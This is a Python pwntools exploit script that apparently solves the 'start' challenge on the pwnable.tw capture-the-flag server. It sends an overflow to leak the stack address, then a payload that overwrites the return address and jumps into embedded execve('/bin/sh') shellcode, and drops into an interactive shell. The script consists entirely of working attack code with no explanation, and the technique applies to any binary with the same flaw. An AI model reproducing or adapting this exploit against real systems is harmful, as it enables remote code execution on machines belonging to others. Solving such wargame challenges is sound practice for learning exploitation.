from pwn import *
import socket
from pprint import pprint
s = remote("chall.pwnable.tw",10000)
#s = process(argv=[],executable="./start")
fluff =  b"\x41"*20
byte = fluff + b"\x87\x80\x04\x08"

print(s.recv(1024))
s.send(byte)
msg = s.recv(1024)
print(msg)

offset = 4
esp = msg[:offset]
print("esp = ",esp)
new_esp = p32(u32(esp)+20)

payload = fluff + new_esp + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

#attach(s)
s.send(payload)
s.interactive()
